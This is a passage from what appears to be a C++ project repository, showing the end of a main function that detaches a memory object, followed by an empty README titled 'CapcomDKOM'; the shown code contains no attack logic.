		std::cout << jafar << '\n';

		g_pMem->Detach();
	}
	std::cin.get();
	return 0;
}

```

`README.md`:

```md
# CapcomDKOM


```